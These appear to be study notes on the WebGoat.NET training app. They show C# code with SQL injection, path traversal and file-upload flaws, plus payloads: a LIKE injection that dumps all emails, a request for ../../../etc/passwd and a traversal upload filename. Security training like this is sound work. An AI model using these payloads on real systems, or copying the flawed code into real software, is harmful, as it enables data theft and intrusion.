Injection

string sql = "select email from CustomerLogin where customerNumber = " + num;

raw sql query is concatinated with user input

string sql = "select firstName, lastName, email from Employees where firstName like '" + name + "%' or lastName like '" + name + "%'";

Like operator is used to filter out emails

we can get all email accounts using

_'--

'_' -> match anyting

string filename = Request.QueryString["filename"];

ResponseFile(Request, Response, filename, MapPath("~/Downloads/" + filename), 100);

we just request any file 

GET /Content/PathManipulation.aspx?filename=../../../etc/passwd

string filename = Path.GetFileName(FileUpload1.FileName);
FileUpload1.SaveAs(Server.MapPath("~/WebGoatCoins/uploads/") + filename);

filename is just concatinated with the path, no input validation

Content-Disposition: form-data; name="ctl00$BodyContentPlaceholder$FileUpload1"; filename="../../../tmp/test.txt"

update the file name by intercepting the request
